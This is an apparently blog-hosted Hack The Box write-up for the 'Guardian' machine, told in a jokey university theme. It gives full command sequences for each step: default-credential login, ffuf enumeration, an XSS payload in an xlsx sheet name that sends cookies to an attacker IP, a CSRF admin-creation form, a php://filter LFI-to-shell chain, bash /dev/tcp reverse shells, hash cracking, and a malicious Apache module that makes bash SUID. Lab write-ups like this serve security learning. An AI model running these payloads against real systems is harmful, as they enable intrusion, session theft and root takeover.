Welcome to **Guardian (HTB)**, the university where passwords are weaker than cafeteria coffee.  
In this thrilling adventure, we’ll go from being a freshman student with identified creds → to hijacking lecturers → impersonating admins → and finally crowning ourselves the **Root Principal**. 🎓👑

---

## 🎬 Act 1 – Enrollment Day (Initial Foothold)

Every heist starts with recon. We scan the gates:

```bash
nmap -sC -sV -oA guardian guardian.htb
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756878824910/a9f59a20-3ec5-46af-a11c-46bc57082c4c.png align="center")

Ports revealed:

* 22 → SSH
    
* 80 → HTTP (Apache)
    

Visiting `http://guardian.htb` shows the **Student Portal**.  
Like every lazy sysadmin, they left default creds in place:

```plaintext
Username: GU0142023
Password: GU1234
```

💥 Welcome to Guardian University, rookie hacker. You’re officially a student!

---

## 🎬 Act 2 – The Gossip Lounge (Chat Enumeration)

Students gossip in the chat system. URLs look like this:

```plaintext
http://portal.guardian.htb/student/chat.php?chat_users[0]=1&chat_users[1]=2
```

Looks **fuzzable**. Let’s enumerate.

```bash
seq 1 20 > nums.txt

ffuf   -u 'http://portal.guardian.htb/student/chat.php?chat_users[0]=FUZZ1&chat_users[1]=FUZZ2'   -w nums.txt:FUZZ1   -w nums.txt:FUZZ2   -mode clusterbomb   -H 'Cookie: PHPSESSID=03oc70jb5sohv0q245rslhhuvf'   -fl 178,164
```

Output highlights:

```plaintext
FUZZ1: 1 | FUZZ2: 2
FUZZ1: 2 | FUZZ2: 1
```

And from this gossip session, we snag creds for a dev:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756878873177/5672509f-ea88-44ba-ae9b-c07b128560f2.png align="center")

```plaintext
Username: jamil.enockson@guardian.htb
Password: DHsNnk3V503
```

Time to crash the staff room.

---

## 🎬 Act 3 – The Code Vault (Gitea)

At `http://gitea.guardian.htb`, we log in with Jamil’s creds.  
Inside: **portal configs** (DB creds!) and code using **PhpSpreadsheet**.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756878906147/5724e7de-2780-4c3d-a765-a8c8261ed3f2.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756878927584/9da1282d-47f9-433a-89d1-b2ca04c9df5a.png align="center")

The devs basically left the **answer sheet** lying around. 🎯

---

## 🎬 Act 4 – The Spreadsheet of Doom (XSS → Lecturer)

In the **assignment submission** module, PhpSpreadsheet fails to sanitize sheet names.  
Meaning → we can upload an `.xlsx` with **JavaScript in the sheet title**.

Evil homework time:

```python
from openpyxl import Workbook
wb = Workbook()
ws1 = wb.active
ws1.title = 'Sheet1'
wb.create_sheet(title='<script>new Image().src="http://YOUR_IP/?c="+document.cookie</script>')
wb.save('exploit.xlsx')
```

Host a listener:

```bash
sudo python3 -m http.server 80
```

Upload the evil file → lecturer opens it → cookie stolen:

```plaintext
GET /?c=PHPSESSID=0o291cbml9r3m23nu8lp3iso5t
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756878972700/8396f7b7-da08-4b40-a25d-39ab3244d832.png align="center")

Swap cookie in browser → 🎉 We’re a **Lecturer** now.

---

## 🎬 Act 5 – Notice Me Senpai (Lecturer → Admin)

Lecturers can post **Notices**, which admins dutifully read.

We notice `/admin/createuser.php` has weak CSRF handling. Tokens never expire.  
So let’s make our own **forever admin**:

```html
<!DOCTYPE html>
<html>
<body>
<form id="csrfForm" action="http://portal.guardian.htb/admin/createuser.php" method="POST">
  <input type="hidden" name="username" value="attacker">
  <input type="hidden" name="password" value="P@ssw0rd123">
  <input type="hidden" name="full_name" value="Attacker User">
  <input type="hidden" name="email" value="attacker@example.com">
  <input type="hidden" name="user_role" value="admin">
  <input type="hidden" name="csrf_token" value="VALID_TOKEN_HERE">
</form>
<script>document.getElementById('csrfForm').submit();</script>
</body>
</html>
```

Open locally → account created.  
Now we’re a **legit admin** forever. 🏆

---

## 🎬 Act 6 – The Report Card Trick (LFI → Shell)

The Reports page only allows 4 whitelisted files, but we bypass it using **php://filter**.

Generate PHP payload:

```bash
python3 php_filter_chain_generator.py --chain '<?php eval($_POST["a"]);?>'
```

Craft URL:

```plaintext
http://portal.guardian.htb/admin/reports.php?report=php://filter/CHAIN,system.php
```

Start listener:

```bash
nc -lvnp 4444
```

Trigger reverse shell:

```bash
curl -X POST   -d 'a=system("bash -i >& /dev/tcp/YOUR_IP/4444 0>&1");'   "http://portal.guardian.htb/admin/reports.php?report=php://filter/CHAIN,system.php"
```

🐚 Shell as **www-data**.

---

## 🎬 Act 7 – Crack Pass (MySQL Looting)

On the box, MySQL is open locally:

```bash
ss -tuln
```

From config.php we already know creds:

```plaintext
root : Gu4rd14n_un1_1s_th3_b3st
```

Connect and dump hashes:

```sql
select username,password_hash from users;
```

Hash logic = SHA256(password + salt), salt = `8Sb)tM1vs1SS`.

We crack with a Python script:

```python
import hashlib

SALT = "8Sb)tM1vs1SS"
def check_password(password, target_hash):
    return hashlib.sha256((password + SALT).encode()).hexdigest() == target_hash
```

Results:

```plaintext
admin : fakebake000
jamil.enockson : copperhouse56
```

Now we can SSH as Jamil. 🎯

---

## 🎬 Act 8 – Owning Mark (Abusing Utilities.py)

SSH as Jamil:

```bash
ssh jamil@guardian.htb
```

User Flag:

```bash
cat user.txt
```

Next: Check sudo:

```bash
sudo -l
```

Output:

```plaintext
(jamil) may run (mark) NOPASSWD: /opt/scripts/utilities/utilities.py
```

Looking inside, `system-status` calls `utils/status.py`.  
Permissions show `status.py` is writable!

Edit it to spawn a shell:

```python
def system_status():
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'")
```

Start listener:

```bash
nc -lvnp 4444
```

Execute as mark:

```bash
sudo -u mark /opt/scripts/utilities/utilities.py system-status
```

💥 Shell as **mark**.

---

## 🎬 Act 9 – Summoning Root (Evil Apache Module)

Mark can run:

```plaintext
(ALL) NOPASSWD: /usr/local/bin/safeapache2ctl
```

We craft an evil Apache module(evil.c):

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor)) void init() {
    setuid(0);
    system("chmod +s /bin/bash");
}
```

Write config:

```bash
echo "LoadModule evil_module /home/mark/confs/evil.so" > /home/mark/confs/exploit.conf
```

Compile:

```bash
gcc -shared -fPIC -o /home/mark/confs/evil.so /home/mark/evil.c
```

Run with sudo:

```bash
sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/exploit.conf
```

Now `/bin/bash` has SUID. Pop root:

```bash
 ls -al /bin/bash
 bash -p
```

👑 We are Root.

```bash
cat /root/root.txt
```

## Root Flag Acquired....

# 🎉 Epilogue – Graduation Day

We started as a freshman with default creds.  
We gossiped our way into Gitea, submitted evil homework, hijacked lecturers, fooled admins, cracked passwords, rewrote utilities, and finally **ruled Guardian University** as Root Principal.

**Key Exploits Recap:**

* Default creds → Student portal
    
* ffuf clusterbomb → Gitea creds
    
* PhpSpreadsheet XSS → Lecturer session
    
* Notice XSS → Admin session
    
* CSRF → permanent Admin account
    
* LFI filter chains → www-data shell
    
* MySQL loot + cracking → Jamil creds
    
* Writable status.py abuse → Mark shell
    
* Evil Apache module → Root
    

📚 Lesson: Universities may teach security, but they rarely practice it.  
Mission accomplished, hacker. 🕶️
